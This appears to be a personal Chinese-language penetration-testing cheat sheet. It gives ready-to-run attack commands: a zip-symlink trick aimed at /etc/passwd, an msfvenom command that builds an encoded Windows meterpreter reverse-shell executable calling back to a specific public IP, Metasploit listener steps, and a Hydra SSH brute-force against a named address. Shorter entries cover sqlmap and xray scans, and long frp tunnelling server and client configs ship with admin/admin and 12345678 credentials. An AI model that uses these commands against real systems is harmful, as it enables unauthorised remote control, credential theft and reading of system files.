
## 软链接
在/bin/mklink
使用 mklink /etc/passwd passwd
自动生成passwd.zip
```php
#!/bin/bash
ln -s $1 $2
zip --symlinks $2.zip $2
rm $2         
```

## GIT
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230705202542.png)


## nmap
## msf
msfvenom生成reverse_shell马
```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=115.236.153.174 LPORT=39063 -b "\x00" -i 10 -f exe -o /tmp/window_remote_hsk.exe
```

监听端口
```shell
msfconsole  //启动
​
use exploit/multi/handler  //开启监听 
​
set payload windows/meterpreter/reverse_tcp  //设置payload，选择漏洞利用模块
​
set lhost 192.168.36.134  //本地IP，即攻击IP
​
set lport 4444  //监听端口
​
exploit   //攻击
```

[msf后渗透测试萌新指南](https://www.anquanke.com/post/id/164525#h3-21)
[msf获取到session后的命令集合](https://blog.csdn.net/qq_39101049/article/details/96854716)

## Hydra

```
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.240.52 ssh
```

## xray
```shell
//基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描
xray webscan --basic-crawler http://example.com --html-output vuln.html
//使用代理
xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
//扫描单个url
xray webscan --url http://example.com?a=b --html-output single-url.html

```


## sqlmap

```bash
sqlmap -u "<url>"

sqlmap -r "<http>.txt"

sqlmap -u "<url>" --data "<post>"
```

## frp
#### frps
```toml
 
# This configuration file is for reference only. Please do not use this configuration directly to run the program as it may have various issues.
# 此配置文件仅供参考。请不要直接使用此配置来运行程序，因为它可能有各种问题。
 
 
# A literal address or host name for IPv6 must be enclosed 
# in square brackets, as in "[::1]:80", "[ipv6-host]:http" or "[ipv6-host%zone]:80" 
# IPv6 的文字地址或主机名必须括在方括号中，如 “[：：1]：80”、“[ipv6-host]：http” 或 “[ipv6-host%zone]：80” 
# For single "bindAddr" field, no need square brackets, like `bindAddr = "::"`. 
# 对于单个 “bindAddr” 字段，不需要方括号，例如 'bindAddr = “：：”'。
bindAddr = "0.0.0.0"
bindPort = 7000
 
# udp port used for kcp protocol, it can be same with 'bindPort'. 
# UDP 端口用于 kcp 协议，它可以与 'bindPort' 相同。
# if not set, kcp is disabled in frps. 
# 如果未设置，则在 FRPS 中禁用 KCP。kcp绑定端口 = 7000
kcpBindPort = 7000
 
# udp port used for quic protocol. 
# 用于 QUIC 协议的 UDP 端口。
# if not set, quic is disabled in frps. 
# 如果未设置，则在 FRPS 中禁用 QUIC。
# quicBindPort = 7002
 
 
# Specify which address proxy will listen for, default value is same with bindAddr 
# 指定代理将侦听的地址，默认值与 bindAddr 相同 
# proxyBindAddr = "127.0.0.1"
 
# quic protocol options 
# quic 协议选项 
# transport.quic.keepalivePeriod = 10 
# transport.quic.maxIdleTimeout = 30 
# transport.quic.maxIncomingStreams = 100000
 
# Heartbeat configure, it's not recommended to modify the default value 
# 心跳配置，不建议修改默认值 
# The default value of heartbeatTimeout is 90. Set negative value to disable it. 
# 心跳超时的默认值为 90。设置负值以禁用它。
# transport.heartbeatTimeout = 90
 
# Pool count in each proxy will keep no more than maxPoolCount. 
# 每个代理中的池计数将保留不超过 maxPoolCount。
transport.maxPoolCount = 5
 
# If tcp stream multiplexing is used, default is true 
# 如果使用 tcp 流多路复用，则默认值为 true 
# transport.tcpMux = true
 
# Specify keep alive interval for tcp mux. 
# 指定 tcp 复用的保活间隔。
# only valid if tcpMux is true. 
# 仅在 tcpMux 为真时有效。
# transport.tcpMuxKeepaliveInterval = 60
 
# tcpKeepalive specifies the interval between keep-alive probes for an active network connection between frpc and frps. 
# tcpKeepalive 指定 frpc 和 frps 之间活动网络连接的保持活动探测器之间的间隔。
# If negative, keep-alive probes are disabled. 
# 如果为负数，则禁用保活探测器。
# transport.tcpKeepalive = 7200
 
# transport.tls.force specifies whether to only accept TLS-encrypted connections. By default, the value is false. 
# transport.tls.force 指定是否只接受 TLS 加密的连接。默认情况下，该值为 false。tls.force = false
tls.force = false
 
# transport.tls.certFile = "server.crt" 
# transport.tls.keyFile = "server.key" 
# transport.tls.trustedCaFile = "ca.crt"
 
# If you want to support virtual host, you must set the http port for listening (optional) 
# 如果要支持虚拟主机，必须设置 http 端口进行监听（可选） 
# Note: http port and https port can be same with bindPort vhostHTTPPort = 80 vhostHTTPSPort = 443
# 注意：http 端口和 https 端口可以与 bindPort 相同
vhostHTTPPort = 80
vhostHTTPSPort = 443
 
# Response header timeout(seconds) for vhost http server, default is 60s 
# vhost http 服务器的响应头超时（秒），默认为 60s 
# vhostHTTPTimeout = 60
 
# tcpmuxHTTPConnectPort specifies the port that the server listens for TCP 
# tcpmuxHTTPConnectPort 指定服务器侦听 TCP 
# HTTP CONNECT requests. If the value is 0, the server will not multiplex TCP 
# HTTP CONNECT 请求的端口。如果值为 0，则服务器不会在一个端口上多路复用 TCP 
# requests on one single port. If it's not - it will listen on this value for 
# 请求。如果不是 - 它将侦听 
# HTTP CONNECT requests. By default, this value is 0. 
# HTTP CONNECT 请求的此值。默认情况下，此值为 0。
# tcpmuxHTTPConnectPort = 1337
 
# If tcpmuxPassthrough is true, frps won't do any update on traffic. 
# 如果 tcpmux直通 为真，frps 不会对流量进行任何更新。
# tcpmuxPassthrough = false
 
# Configure the web server to enable the dashboard for frps. 
# 配置 Web 服务器以启用 frps 的仪表板。
# dashboard is available only if webServer.port is set. 
# 仪表板仅在设置 webServer.port 时才可用。
webServer.addr = "127.0.0.1"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "admin"
# webServer.tls.certFile = "server.crt"
# webServer.tls.keyFile = "server.key"
# dashboard assets directory(only for debug mode)
# dashboard assets directory（仅适用于调试模式） 
# webServer.assetsDir = "./static"
 
# Enable golang pprof handlers in dashboard listener. 
# 在仪表板侦听器中启用 golang pprof 处理程序。
# Dashboard port must be set first 
# 仪表板端口必须首先设置 webServer.pprofEnable = false
webServer.pprofEnable = false
 
# enablePrometheus will export prometheus metrics on webServer in /metrics api. 
# enablePrometheus 将在 /metrics API 中导出 webServer 上的 Prometheus 指标。启用普罗米修斯 = 真
enablePrometheus = true
 
# console or real logFile path like ./frps.log 
# 控制台或实际日志文件路径，如 ./frps.log log.to = “./frps.log” 
log.to = "./frps.log" 
# trace, debug, info, warn, error 
# 跟踪、调试、信息、警告、错误 log.level = “info” log.maxDays = 3 
log.level = "info" 
log.maxDays = 3 
# disable log colors when log.to is console, default is false 
# 当 log.to 是控制台时禁用日志颜色，默认值为 false log.disablePrintColor = false
log.disablePrintColor = false
 
# DetailedErrorsToClient defines whether to send the specific error (with debug info) to frpc. By default, this value is true. 
# DetailedErrorsToClient 定义是否将特定错误（带有调试信息）发送到 frpc。默认情况下，此值为 true。detailedErrorsToClient = true
detailedErrorsToClient = true
 
# auth.method specifies what authentication method to use authenticate frpc with frps. 
# auth.method 指定使用哪种身份验证方法对 FRPC 进行 FRP 身份验证。
# If "token" is specified - token will be read into login message. 
# 如果指定了“token”，令牌将被读入登录消息。
# If "oidc" is specified - OIDC (Open ID Connect) token will be issued using OIDC settings. By default, this value is "token". 
# 如果指定了“oidc”，将使用 OIDC 设置颁发 OIDC（开放 ID 连接）令牌。默认情况下，此值为“令牌”。auth.method = “token”
auth.method = "token"
 
# auth.additionalScopes specifies additional scopes to include authentication information. 
# auth.additionalScopes 指定其他范围以包含身份验证信息。
# Optional values are HeartBeats, NewWorkConns. 
# 可选值为 HeartBeats、NewWorkConns。
# auth.additionalScopes = ["HeartBeats", "NewWorkConns"]
 
# auth token 
# 身份验证令牌 auth.token = “12345678”
auth.token = "12345678"
 
# oidc issuer specifies the issuer to verify OIDC tokens with. 
# OIDC 颁发者指定用于验证 OIDC 令牌的颁发者。auth.oidc.issuer = “” 
auth.oidc.issuer = "" 
# oidc audience specifies the audience OIDC tokens should contain when validated. 
# OIDC 受众指定 OIDC 令牌在验证时应包含的受众。auth.oidc.audience = “” 
auth.oidc.audience = "" 
# oidc skipExpiryCheck specifies whether to skip checking if the OIDC token is expired. 
# oidc skipExpiryCheck 指定在 OIDC 令牌过期时是否跳过检查。auth.oidc.skipExpiryCheck = false 
auth.oidc.skipExpiryCheck = false 
# oidc skipIssuerCheck specifies whether to skip checking if the OIDC token's issuer claim matches the issuer specified in OidcIssuer. 
# oidc skipIssuerCheck 指定是否跳过检查 OIDC 令牌的颁发者声明是否与 OidcIssuer 中指定的颁发者匹配。auth.oidc.skipIssuerCheck = false
auth.oidc.skipIssuerCheck = false
 
# userConnTimeout specifies the maximum time to wait for a work connection. 
# userConnTimeout 指定等待工作连接的最长时间。
# 用户连接超时 = 10
# userConnTimeout = 10
 
# Only allow frpc to bind ports you list. By default, there won't be any limit.
# 只允许 frpc 绑定你列出的端口。默认情况下，不会有任何限制。allowPorts = [ { start = 2000， end = 3000 }， { single = 3001 }， { single = 3003 }， { start = 4000， end = 50000 } ]
allowPorts = [
  { start = 2000, end = 3000 },
  { single = 3001 },
  { single = 3003 },
  { start = 4000, end = 50000 }
]
 
# 每个客户端可以使用的最大端口数，默认值为 0 表示无限制 maxPortsPerClient = 0
# Max ports can be used for each client, default value is 0 means no limit
maxPortsPerClient = 0
 
# 如果子域主机不为空，则可以在 frpc 的配置文件中设置类型为 http 或 https 的子域 
# 当子域为 est 时，路由使用的主机为 test.frps.com 子域主机 = “frps.com”
# If subDomainHost is not empty, you can set subdomain when type is http or https in frpc's configure file
# When subdomain is est, the host used by routing is test.frps.com
subDomainHost = "frps.com"
 
# HTTP 请求的自定义 404 页面 
# custom 404 page for HTTP requests
# 自定义 404Page = “/path/to/404.html”
# custom404Page = "/path/to/404.html"
 
# 指定 udp 数据包大小，单位为字节。如果未设置，则默认值为 1500。
# 客户端和服务器之间的参数应该相同。
# 它会影响 udp 和 sudp 代理。udp数据包大小 = 1500
# specify udp packet size, unit is byte. If not set, the default value is 1500.
# This parameter should be same between client and server.
# It affects the udp and sudp proxy.
udpPacketSize = 1500
 
# NAT 打孔策略数据的保留时间。nathole分析数据储备小时数 = 168
# Retention time for NAT hole punching strategy data.
natholeAnalysisDataReserveHours = 168
 
[[httpPlugins]]
name = "user-manager"
addr = "127.0.0.1:9000"
path = "/handler"
ops = ["Login"]
 
[[httpPlugins]]
name = "port-manager"
addr = "127.0.0.1:9001"
path = "/handler"
ops = ["NewProxy"]
 
 
```
##### frpc
#### frpc
```toml
 
# This configuration file is for reference only. Please do not use this configuration directly to run the program as it may have various issues.
# 此配置文件仅供参考。请不要直接使用此配置来运行程序，因为它可能有各种问题。
 
# 您的代理名称将更改为 {用户}。{proxy} user = “your_name”
# your proxy name will be changed to {user}.{proxy}
user = "your_name"
 
# IPv6 的文字地址或主机名必须括在方括号中 
# 中，如 “[：：1]：80”、“[ipv6-host]：http” 或 “[ipv6-host%zone]：80” 
# 对于单个服务器 Addr 字段，不需要方括号，例如 serverAddr = “：：”。serverAddr = “0.0.0.0” serverPort = 7000
# A literal address or host name for IPv6 must be enclosed
# in square brackets, as in "[::1]:80", "[ipv6-host]:http" or "[ipv6-host%zone]:80"
# For single serverAddr field, no need square brackets, like serverAddr = "::".
serverAddr = "0.0.0.0"
serverPort = 7000
 
#STUN服务器帮助穿透NAT孔。
# natHoleStunServer = “stun.easyvoip.com:3478”
# STUN server to help penetrate NAT hole.
# natHoleStunServer = "stun.easyvoip.com:3478"
 
# 判断首次登录时是否退出程序失败，否则连续重新登录 frps 
# 默认为 true loginFailExit = true
# Decide if exit program when first login failed, otherwise continuous relogin to frps
# default is true
loginFailExit = true
 
# 控制台或实际日志文件路径，如 ./frpc.log log.to = “./frpc.log” 
# 跟踪、调试、信息、警告、错误 log.level = “info” log.maxDays = 3 
# 当 log.to 是控制台时禁用日志颜色，默认值为 false log.disablePrintColor = false
# console or real logFile path like ./frpc.log
log.to = "./frpc.log"
# trace, debug, info, warn, error
log.level = "info"
log.maxDays = 3
# disable log colors when log.to is console, default is false
log.disablePrintColor = false
 
 
 # auth.additionalScopes 指定其他范围以包含身份验证信息。
 # 可选值为 HeartBeats、NewWorkConns。
 # auth.additionalScopes = [“HeartBeats”， “NewWorkConns”]
auth.method = "token"
# auth.additionalScopes specifies additional scopes to include authentication information.
# Optional values are HeartBeats, NewWorkConns.
# auth.additionalScopes = ["HeartBeats", "NewWorkConns"]
 
# 身份验证令牌 auth.token = “12345678”
# auth token
auth.token = "12345678"
 
# oidc.clientID 指定用于在 OIDC 身份验证中获取令牌的客户端 ID。
# auth.oidc.clientID = “” 
# oidc.clientSecret 指定用于在 OIDC 身份验证中获取令牌的客户端密钥。
# auth.oidc.clientSecret = “” 
# oidc.audience 指定 OIDC 身份验证中令牌的受众。
# auth.oidc.audience = “” 
# oidc.scope 指定 OIDC 身份验证中令牌的允许，如果 AuthenticationMethod == “oidc”。默认情况下，此值为 “”。
# auth.oidc.scope = “” 
# oidc.tokenEndpointURL 指定实现 OIDC 令牌端点的 URL。
# 它将用于获取 OIDC 令牌。
# auth.oidc.tokenEndpointURL = “”
# oidc.clientID specifies the client ID to use to get a token in OIDC authentication.
# auth.oidc.clientID = ""
# oidc.clientSecret specifies the client secret to use to get a token in OIDC authentication.
# auth.oidc.clientSecret = ""
# oidc.audience specifies the audience of the token in OIDC authentication.
# auth.oidc.audience = ""
# oidc.scope specifies the permisssions of the token in OIDC authentication if AuthenticationMethod == "oidc". By default, this value is "".
# auth.oidc.scope = ""
# oidc.tokenEndpointURL specifies the URL which implements OIDC Token Endpoint.
# It will be used to get an OIDC token.
# auth.oidc.tokenEndpointURL = ""
 
# oidc.additionalEndpointParams 指定要发送到 OIDC 令牌端点的其他参数。
# 例如，如果要指定 “audience” 参数，可以设置如下。
# frp 会将 “audience=” “var1=” 添加到附加参数中。
# auth.oidc.additionalEndpointParams.audience = “https://dev.auth.com/api/v2/” 
# auth.oidc.additionalEndpointParams.var1 = “foobar”
# oidc.additionalEndpointParams specifies additional parameters to be sent to the OIDC Token Endpoint.
# For example, if you want to specify the "audience" parameter, you can set as follow.
# frp will add "audience=<value>" "var1=<value>" to the additional parameters.
# auth.oidc.additionalEndpointParams.audience = "https://dev.auth.com/api/v2/"
# auth.oidc.additionalEndpointParams.var1 = "foobar"
 
 
# 设置管理员地址，通过 http API 控制 frpc 的操作，例如重新加载 webServer.addr = “127.0.0.1” webServer.port = 7400 webServer.user = “admin” webServer.password = “admin” 
# 管理员资产目录。默认情况下，这些资源与 frpc 捆绑在一起。
# webServer.assetsDir = “./static”
# Set admin address for control frpc's action by http api such as reload
webServer.addr = "127.0.0.1"
webServer.port = 7400
webServer.user = "admin"
webServer.password = "admin"
# Admin assets directory. By default, these assets are bundled with frpc.
# webServer.assetsDir = "./static"
 
# 在管理员侦听器中启用 golang pprof 处理程序。webServer.pprofEnable = false
# Enable golang pprof handlers in admin listener.
webServer.pprofEnable = false
 
# 拨号到服务器等待连接完成的最长时间。默认值为 10 秒。
# transport.dialServerTimeout = 10
# The maximum amount of time a dial to server will wait for a connect to complete. Default value is 10 seconds.
# transport.dialServerTimeout = 10
 
# dialServerKeepalive 指定 frpc 和 frps 之间活动网络连接的保持活动状态探测器之间的间隔。
# 如果为负数，则禁用保活探测器。
# transport.dialServerKeepalive = 7200
# dialServerKeepalive specifies the interval between keep-alive probes for an active network connection between frpc and frps.
# If negative, keep-alive probes are disabled.
# transport.dialServerKeepalive = 7200
 
# 会提前建立连接，默认值为零传输.poolCount = 5
# connections will be established in advance, default value is zero
transport.poolCount = 5
 
# 如果使用 tcp 流多路复用，默认值为 true，它必须与 frps 相同 
# transport.tcpMux = true
# If tcp stream multiplexing is used, default is true, it must be same with frps
# transport.tcpMux = true
 
# 指定 tcp 复用的保活间隔。
# 仅在启用 tcpMux 时才有效。
# transport.tcpMuxKeepaliveInterval = 60
# Specify keep alive interval for tcp mux.
# only valid if tcpMux is enabled.
# transport.tcpMuxKeepaliveInterval = 60
 
# 用于连接服务器的通信协议 
# 现在支持 tcp、kcp、quic、websocket 和 wss，默认为 tcp transport.protocol = “tcp”
# Communication protocol used to connect to server
# supports tcp, kcp, quic, websocket and wss now, default is tcp
transport.protocol = "tcp"
 
# 连接服务器时设置客户端绑定IP，默认为空。
# 仅当协议 = TCP 或 websocket 时，才会使用该值。transport.connectServerLocalIP = “0.0.0.0”
# set client binding ip when connect server, default is empty.
# only when protocol = tcp or websocket, the value will be used.
transport.connectServerLocalIP = "0.0.0.0"
 
# 如果要通过 HTTP 代理或 socks5 代理或 ntlm 代理连接 frps，可以在此处或在全局环境变量中设置 proxyURL 
# 仅当协议为 tcp 时才有效 
# transport.proxyURL = “http://user:passwd@192.168.1.128:8080” 
# transport.proxyURL = “socks5：//user：passwd@192.168.1.128：1080” 
# transport.proxyURL = “ntlm://user:passwd@192.168.1.128:2080”
# if you want to connect frps by http proxy or socks5 proxy or ntlm proxy, you can set proxyURL here or in global environment variables
# it only works when protocol is tcp
# transport.proxyURL = "http://user:passwd@192.168.1.128:8080"
# transport.proxyURL = "socks5://user:passwd@192.168.1.128:1080"
# transport.proxyURL = "ntlm://user:passwd@192.168.1.128:2080"
 
# quic 协议选项 
# transport.quic.keepalivePeriod = 10 
# transport.quic.maxIdleTimeout = 30 
# transport.quic.maxIncomingStreams = 100000
# quic protocol options
# transport.quic.keepalivePeriod = 10
# transport.quic.maxIdleTimeout = 30
# transport.quic.maxIncomingStreams = 100000
 
# 如果 tls.enable 为 true，frpc 将通过 tls 连接 frps。
# 从 v0.50.0 开始，默认值已更改为 true，默认启用 tls。transport.tls.enable = true
# If tls.enable is true, frpc will connect frps by tls.
# Since v0.50.0, the default value has been changed to true, and tls is enabled by default.
transport.tls.enable = true
 
# transport.tls.certFile = "client.crt"
# transport.tls.keyFile = "client.key"
# transport.tls.trustedCaFile = "ca.crt"
# transport.tls.serverName = "example.com"
 
# 如果禁用自定义 TLSFirstByte 设置为 false，则启用 TLS 时，frpc 将使用 
# 第一个自定义字节与 frps 建立连接。
# 从 v0.50.0 开始，默认值更改为 true，默认禁用第一个自定义字节。
# transport.tls.disableCustomTLSFirstByte = true
# If the disableCustomTLSFirstByte is set to false, frpc will establish a connection with frps using the
# first custom byte when tls is enabled.
# Since v0.50.0, the default value has been changed to true, and the first custom byte is disabled by default.
# transport.tls.disableCustomTLSFirstByte = true
 
# 心跳配置，不建议修改默认值。
# 心跳间隔的默认值为 10，心跳超时为 90。设置负值 
# 以禁用它。
# 传输.心跳间隔 = 30 
# 传输.检测信号超时 = 90
# Heartbeat configure, it's not recommended to modify the default value.
# The default value of heartbeatInterval is 10 and heartbeatTimeout is 90. Set negative value
# to disable it.
# transport.heartbeatInterval = 30
# transport.heartbeatTimeout = 90
 
# 指定一个 dns 服务器，所以 frpc 将使用它而不是默认的 
# dnsServer = “8.8.8.8”
# Specify a dns server, so frpc will use this instead of default one
# dnsServer = "8.8.8.8"
 
 
# 要启动的代理名称。
# 默认值为空，表示所有代理。
# start = [“ssh”， “dns”]
# Proxy names you want to start.
# Default is empty, means all proxies.
# start = ["ssh", "dns"]
 
# 指定 udp 数据包大小，单位为字节。如果未设置，则默认值为 1500。
# 客户端和服务器之间的参数应该相同。
# 它会影响 udp 和 sudp 代理。udp数据包大小 = 1500
# Specify udp packet size, unit is byte. If not set, the default value is 1500.
# This parameter should be same between client and server.
# It affects the udp and sudp proxy.
udpPacketSize = 1500
 
# 客户端的其他元数据。metadatas.var1 = “abc” metadatas.var2 = “123”
# Additional metadatas for client.
metadatas.var1 = "abc"
metadatas.var2 = "123"
 
# 包含代理的其他配置文件。
# include = [“./confd/*.ini”]
# Include other config files for proxies.
# includes = ["./confd/*.ini"]
 
 
[[proxies]]
# 'ssh'是唯一的代理名称
# 'ssh' is the unique proxy name
#如果global user不为空，则将其更改为{user}。{代理}，例如'your_name.ssh'
# If global user is not empty, it will be changed to {user}.{proxy} such as 'your_name.ssh'
name = "ssh"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
#限制该代理的带宽，单位为KB和MB
# Limit bandwidth for this proxy, unit is KB and MB
transport.bandwidthLimit = "1MB"
# 在哪里限制带宽，可以是'client'或'server'，默认是'client'。
# Where to limit bandwidth, can be 'client' or 'server', default is 'client'
transport.bandwidthLimitMode = "client"
#如果为true，该代理的流量将被加密，默认为false
# If true, traffic of this proxy will be encrypted, default is false
transport.useEncryption = false
#如果为true，流量将被压缩
# If true, traffic will be compressed
transport.useCompression = false
#远程端口监听
# Remote port listen by frps
remotePort = 6001
# FRPS将对同一组代理的连接进行负载均衡
# frps will load balancing connections for proxies in same group
loadBalancer.group = "test_group"
# group应该有相同的组键
# group should have same group key
loadBalancer.groupKey = "123456"
#启用后端服务的健康检查，它现在支持'tcp'和'http'。
# Enable health check for the backend service, it supports 'tcp' and 'http' now.
# FRPC将连接本地服务的端口以检测其健康状态
# frpc will connect local service's port to detect it's healthy status
healthCheck.type = "tcp"
#健康检查连接超时
# Health check connection timeout
healthCheck.timeoutSeconds = 3
#如果连续3次失败，代理将从frps中删除
# If continuous failed in 3 times, the proxy will be removed from frps
healthCheck.maxFailed = 3
##每10秒进行一次健康检查
# every 10 seconds will do a health check
healthCheck.intervalSeconds = 10
##每个代理的附加元信息
# additional meta info for each proxy
metadatas.var1 = "abc"
metadatas.var2 = "123"
 
[[proxies]]
name = "ssh_random"
type = "tcp"
localIP = "192.168.31.100"
localPort = 22
#如果remotePort为0,frps将为您分配一个随机端口
# If remotePort is 0, frps will assign a random port for you
remotePort = 0
 
[[proxies]]
name = "dns"
type = "udp"
localIP = "114.114.114.114"
localPort = 53
remotePort = 6002
 
#将您的域名解析为[serverAddr]，以便您可以使用http://web01.yourdomain.com浏览web01和http://web02.yourdomain.com浏览web02
# Resolve your domain names to [serverAddr] so you can use http://web01.yourdomain.com to browse web01 and http://web02.yourdomain.com to browse web02
[[proxies]]
name = "web01"
type = "http"
localIP = "127.0.0.1"
localPort = 80
# HTTP用户名和密码是HTTP协议的安全认证
# http username and password are safety certification for http protocol
#如果没有设置，您可以在没有认证的情况下访问此customDomains
# if not set, you can access this customDomains without certification
httpUser = "admin"
httpPassword = "admin"
#如果frps的域名是frps.com，那么你可以通过URL http://web01.frps.com访问[web01]代理
# if domain for frps is frps.com, then you can access [web01] proxy by URL http://web01.frps.com
subdomain = "web01"
customDomains = ["web01.yourdomain.com"]
# locations仅对HTTP类型可用
# locations is only available for http type
locations = ["/", "/pic"]
#路由请求到此服务，如果HTTP基本自动用户是ABC
# routeByHTTPUser = abc
# route requests to this service if http basic auto user is abc
# routeByHTTPUser = abc
hostHeaderRewrite = "example.com"
requestHeaders.set.x-from-where = "frp"
healthCheck.type = "http"
# frpc将发送GET http请求'/status'到本地http服务
# HTTP服务是活的，当它返回2xx HTTP响应代码
# frpc will send a GET http request '/status' to local http service
# http service is alive when it return 2xx http response code
healthCheck.path = "/status"
healthCheck.intervalSeconds = 10
healthCheck.maxFailed = 3
healthCheck.timeoutSeconds = 3
 
[[proxies]]
name = "web02"
type = "https"
localIP = "127.0.0.1"
localPort = 8000
subdomain = "web02"
customDomains = ["web02.yourdomain.com"]
#如果不为空，FRPC将使用代理协议将连接信息传输到本地服务
# v1或v2或空
# if not empty, frpc will use proxy protocol to transfer connection info to your local service
# v1 or v2 or empty
transport.proxyProtocolVersion = "v2"
 
[[proxies]]
name = "tcpmuxhttpconnect"
type = "tcpmux"
multiplexer = "httpconnect"
localIP = "127.0.0.1"
localPort = 10701
customDomains = ["tunnel1"]
# routeByHTTPUser = "user1"
 
[[proxies]]
name = "plugin_unix_domain_socket"
type = "tcp"
remotePort = 6003
#如果定义了插件，localIP和localPort是无用的
# plugin将处理从FRPS获得的连接
# if plugin is defined, localIP and localPort is useless
# plugin will handle connections got from frps
[proxies.plugin]
type = "unix_domain_socket"
unixPath = "/var/run/docker.sock"
 
[[proxies]]
name = "plugin_http_proxy"
type = "tcp"
remotePort = 6004
[proxies.plugin]
type = "http_proxy"
httpUser = "abc"
httpPassword = "abc"
 
[[proxies]]
name = "plugin_socks5"
type = "tcp"
remotePort = 6005
[proxies.plugin]
type = "socks5"
username = "abc"
password = "abc"
 
[[proxies]]
name = "plugin_static_file"
type = "tcp"
remotePort = 6006
[proxies.plugin]
type = "static_file"
localPath = "/var/www/blog"
stripPrefix = "static"
httpUser = "abc"
httpPassword = "abc"
 
[[proxies]]
name = "plugin_https2http"
type = "https"
customDomains = ["test.yourdomain.com"]
[proxies.plugin]
type = "https2http"
localAddr = "127.0.0.1:80"
crtPath = "./server.crt"
keyPath = "./server.key"
hostHeaderRewrite = "127.0.0.1"
requestHeaders.set.x-from-where = "frp"
 
[[proxies]]
name = "plugin_https2https"
type = "https"
customDomains = ["test.yourdomain.com"]
[proxies.plugin]
type = "https2https"
localAddr = "127.0.0.1:443"
crtPath = "./server.crt"
keyPath = "./server.key"
hostHeaderRewrite = "127.0.0.1"
requestHeaders.set.x-from-where = "frp"
 
[[proxies]]
name = "plugin_http2https"
type = "http"
customDomains = ["test.yourdomain.com"]
[proxies.plugin]
type = "http2https"
localAddr = "127.0.0.1:443"
hostHeaderRewrite = "127.0.0.1"
requestHeaders.set.x-from-where = "frp"
 
[[proxies]]
name = "secret_tcp"
#如果类型是secret tcp, remotePort是无用的
#如果想要连接本地端口，应该部署另一个带有stcp代理的frpc，角色为访问者
# If the type is secret tcp, remotePort is useless
# Who want to connect local port should deploy another frpc with stcp proxy and role is visitor
type = "stcp"
# secretKey用于访问者的身份验证
# secretKey is used for authentication for visitors
secretKey = "abcdefg"
localIP = "127.0.0.1"
localPort = 22
#如果不为空，则只有来自指定用户的访问者可以访问
# If not empty, only visitors from specified users can connect.
#否则，来自同一用户的访问者可以连接。“*”表示允许所有用户。
# Otherwise, visitors from same user can connect. '*' means allow all users.
allowUsers = ["*"]
 
[[proxies]]
name = "p2p_tcp"
type = "xtcp"
secretKey = "abcdefg"
localIP = "127.0.0.1"
localPort = 22
#如果不为空，只有来自指定用户的访问者可以连接。
#否则，来自同一用户的访问者可以连接。“*”表示允许所有用户。
# If not empty, only visitors from specified users can connect.
# Otherwise, visitors from same user can connect. '*' means allow all users.
allowUsers = ["user1", "user2"]
 
# frpc role visitor -> frps -> frpc role server
[[visitors]]
name = "secret_tcp_visitor"
type = "stcp"
#您要访问的服务器名称
# the server name you want to visitor
serverName = "secret_tcp"
secretKey = "abcdefg"
#将此地址连接到访问者STCP服务器
# connect this address to visitor stcp server
bindAddr = "127.0.0.1"
# bindPort可以小于0，这意味着不绑定端口，只接收重定向的连接
#其他访客。(目前SUDP不支持此功能)
# bindPort can be less than 0, it means don't bind to the port and only receive connections redirected from
# other visitors. (This is not supported for SUDP now)
bindPort = 9000
 
[[visitors]]
name = "p2p_tcp_visitor"
type = "xtcp"
#如果未设置服务器用户，则默认为当前用户
# if the server user is not set, it defaults to the current user
serverUser = "user1"
serverName = "p2p_tcp"
secretKey = "abcdefg"
bindAddr = "127.0.0.1"
# bindPort可以小于0，这意味着不绑定端口，只接收重定向的连接
#其他访客。(目前SUDP不支持此功能)
# bindPort can be less than 0, it means don't bind to the port and only receive connections redirected from
# other visitors. (This is not supported for SUDP now)
bindPort = 9001
#当需要自动隧道持久化时，设置为true
# when automatic tunnel persistence is required, set it to true
keepTunnelOpen = false
#当keepTunnelOpen设置为true时有效，每小时尝试通过的次数
# effective when keepTunnelOpen is set to true, the number of attempts to punch through per hour
maxRetriesAnHour = 8
minRetryInterval = 90
# fallbackTo = "stcp_visitor"
# fallbackTimeoutMs = 500
 
```